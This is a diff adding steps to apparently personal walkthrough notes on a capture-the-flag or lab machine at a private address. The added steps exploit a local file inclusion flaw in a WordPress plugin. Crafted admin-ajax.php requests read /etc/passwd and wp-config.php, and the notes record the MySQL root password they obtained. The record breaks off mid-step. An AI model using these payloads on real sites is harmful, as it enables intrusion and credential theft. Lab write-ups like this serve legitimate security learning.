@@ -28,3 +28,13 @@ results:
 
 4. Looking for vul. in installed plugins
 > found LFI exploit for that > https://www.exploit-db.com/exploits/39646/
+> change the payload to: https://192.168.56.102/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/etc/passwd (checking the /etc/passwd)
+> results: image file in /uploads/ folder
+> wget file with: wget --no-check-certificate https://192.168.56.102:12380/blogblog/wp-content/uploads/[image.jpg]
+> cat image.jpg
+> results: all user list (create user.txt file from it)
+
+5. Check the wp config with: https://192.168.56.102/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
+> wget file
+> cat file [image], result: wp-config.php with mysql credentials: user: root, password: plbkac
+> connecting to mysql DB with 
